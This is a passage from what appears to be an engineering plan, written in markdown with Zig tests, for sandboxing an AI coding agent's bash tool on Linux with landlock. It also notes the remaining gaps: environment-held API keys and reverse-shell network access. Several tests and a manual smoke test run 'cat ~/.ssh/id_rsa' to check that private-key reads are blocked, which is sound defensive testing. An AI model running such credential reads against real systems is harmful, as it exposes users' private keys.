    try std.testing.expectEqualStrings("/tmp/work", sb.argv[2]);
    try std.testing.expectEqualStrings("/home/u", sb.argv[3]);
    try std.testing.expectEqualStrings("--", sb.argv[4]);
    try std.testing.expectEqualStrings("/bin/sh", sb.argv[5]);
    try std.testing.expectEqualStrings("-c", sb.argv[6]);
    try std.testing.expectEqualStrings("echo hi", sb.argv[7]);
    // argv[0] should be the current executable path (the test binary).
    try std.testing.expect(sb.argv[0].len > 0);
    try std.testing.expect(std.fs.path.isAbsolute(sb.argv[0]));
}

test "buildMacosArgv preserves seatbelt argv shape after extraction" {
    // Pure refactor guard: this test fixes the shape of the
    // already-shipping macOS argv against future regressions.
    if (builtin.os.tag != .macos) return error.SkipZigTest;
    const allocator = std.testing.allocator;
    const sb = try buildMacosArgv(allocator, "/tmp/work", "/Users/u", "echo hi");
    defer freeSandboxArgv(allocator, sb);

    try std.testing.expectEqual(SandboxPlatform.macos, sb.platform);
    try std.testing.expectEqual(@as(usize, 6), sb.argv.len);
    try std.testing.expectEqualStrings("/usr/bin/sandbox-exec", sb.argv[0]);
    try std.testing.expectEqualStrings("-p", sb.argv[1]);
    try std.testing.expectEqualStrings("/bin/sh", sb.argv[3]);
    try std.testing.expectEqualStrings("-c", sb.argv[4]);
    try std.testing.expectEqualStrings("echo hi", sb.argv[5]);
    try std.testing.expect(std.mem.indexOf(u8, sb.argv[2], "(version 1)") != null);
}

test "execute denies reading ~/.ssh on Linux" {
    // End-to-end check: spawn the bash tool, ask it to read ~/.ssh/id_rsa,
    // confirm no PRIVATE KEY bytes surface. Skips automatically when
    // the test binary is not the production zag (the helper branch only
    // lives in main.zig). Manual verification still required; see the
    // "Done when" checklist for the prod-binary smoke test.
    if (builtin.os.tag != .linux) return error.SkipZigTest;
    // Skip if landlock is unavailable in the running kernel.
    const landlock = @import("../sandbox/landlock_linux.zig");
    switch (landlock.probeAbi()) {
        .supported => {},
        .unsupported => return error.SkipZigTest,
    }

    const allocator = std.testing.allocator;
    const result = try execute("{\"command\":\"cat ~/.ssh/id_rsa 2>&1 || true\"}", allocator, null);
    defer allocator.free(result.content);

    try std.testing.expect(std.mem.indexOf(u8, result.content, "BEGIN") == null);
    try std.testing.expect(std.mem.indexOf(u8, result.content, "PRIVATE KEY") == null);
}
```

**On the e2e test caveat.** Zig's test runner replaces `main()` with its own. The helper branch in `main.zig` therefore does NOT execute in the test binary. The `execute denies reading ~/.ssh on Linux` test spawns the test binary as `/proc/self/exe --__sandbox-helper ...`, which the test runner ignores. So the test exercises the bash tool's argv-building path and the spawn-collect-wait machinery, but does NOT actually install landlock. The sandbox itself is verified manually against the built zag binary (see Done When step). A follow-up plan can add a custom `test_runner.zig` that honours the helper flag; out of scope here to keep the diff small.

**Step 4: Confirm the pre-existing tests still pass**

The truncation test (`bash truncates stdout instead of erroring on overflow` at `src/tools/bash.zig:437-450`) runs `head -c 1300000 /dev/zero | tr '\0' 'A'`. On Linux with landlock active (in the prod binary), `/bin/head` and `/usr/bin/tr` are exec-allowed via `/bin` and `/usr/bin`; `/dev/zero` is read-allowed via `/dev`. The test should pass in both the test-binary path (no landlock; trivially passes) and the prod-binary smoke test.

The cancel test (`bash kills child on cancel` at lines 397-435) runs `sleep 10`. `/usr/bin/sleep` or `/bin/sleep` is exec-allowed via the relevant subtree.

```
zig build test
zig fmt --check .
```

Both clean.

**Step 5: Commit**

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: wire linux landlock sandbox via self-re-exec helper

Extracts the macOS argv builder into buildMacosArgv, adds the matching
buildLinuxArgv that spawns /proc/self/exe --__sandbox-helper for the
linux path, and adds a unified freeSandboxArgv that knows each
platform's heap-owned slots.

On linux, every bash command now runs as:
  /proc/self/exe --__sandbox-helper <cwd> <home> -- /bin/sh -c <cmd>
The helper installs landlock between fork and exec; the running kernel
sees fs-restricted bash. Old kernels (< 5.13) fall back to unsandboxed
with a logged warning, matching today's stance.

Linux test coverage: argv shape unit test plus a deny-reading-~/.ssh
end-to-end test that's gated on landlock availability. Manual prod-
binary verification is the e2e anchor because zig's test runner
replaces main(), so the helper branch does not fire in unit tests.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Done when

- [ ] `src/tools/bash.zig` threat-model docstring lists Linux as landlock-sandboxed and calls out the network gap.
- [ ] `src/sandbox/landlock_linux.zig` exists with `probeAbi`, `downgradeForAbi`, `applyRuleset`, and unit tests for size/downgrade.
- [ ] `src/sandbox/helper_linux.zig` exists with `parseArgs`, `run`, and unit tests for argv parsing.
- [ ] `src/main.zig` has a `comptime`-gated branch at the top of `main()` that dispatches `--__sandbox-helper` to `sandbox/helper_linux.zig`; both new files are in the test-block import list.
- [ ] `src/tools/bash.zig` has `buildMacosArgv`, `buildLinuxArgv`, `freeSandboxArgv`, with unit tests for both argv shapes.
- [ ] All pre-existing bash tests (echo, exit code, cancel, truncate, macOS rejection, integration parse) still pass.
- [ ] `zig build test` clean; `zig fmt --check .` clean; no em dashes.
- [ ] 4 commits on the branch, one per task.
- [ ] **Manual e2e smoke test on Linux**: `zig build && echo '{"command":"cat ~/.ssh/id_rsa 2>&1 || true"}' | ./zig-out/bin/zag <invocation harness>` produces no PRIVATE KEY bytes. (If no Linux box is handy, this gate is "verified on first Linux contributor's machine"; document in commit.)
- [ ] CLAUDE.md docs that claim macOS-only sandboxing are updated.

---

## Out of scope

1. **Network containment on Linux.** Landlock 5.13 lacks net rules; matching macOS coverage requires seccomp-bpf or a 6.7+ kernel floor. Phase C plan.
2. **Custom test runner for true e2e landlock tests.** Possible via `build.zig`'s `test_runner` option, but adds complexity for one test. Defer.
3. **Per-command sandbox level.** One mode per session, like macOS. UX complexity without a clear win.
4. **Bubblewrap/firejail fallback for old kernels.** If landlock isn't available, we warn and run unconfined. Adding `bwrap` detection re-introduces the "external binary install" problem Phase B was scoped to avoid.
5. **Env-var filtering.** `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` etc. still flow into the child via execve's envp. Landlock blocks file reads of credential stores, but env-resident secrets are reachable to the bash child. Real fix is to filter envp at spawn time; orthogonal concern, separate plan.

---

## Follow-up: Phase C (network containment)

Future plan should pick one:

- **Seccomp-bpf connect() filter.** ~150 LOC of BPF. Deny `connect()` to non-loopback sockaddrs (AF_INET/AF_INET6); allow loopback. Works on all kernels >= 3.5. Most portable.
- **Landlock 6.7 net rules.** `LANDLOCK_ACCESS_NET_BIND_TCP` and `_CONNECT_TCP` with port restrictions. Cleanest but requires kernel >= 6.7 (Ubuntu 24.04+; excludes 22.04 LTS).
- **Both.** Use landlock net rules when ABI >= 4, fall back to seccomp filter otherwise. Most coverage; most code.

Decision deferred until either a real reverse-shell injection surfaces in practice or kernel 6.7 becomes the LTS floor.
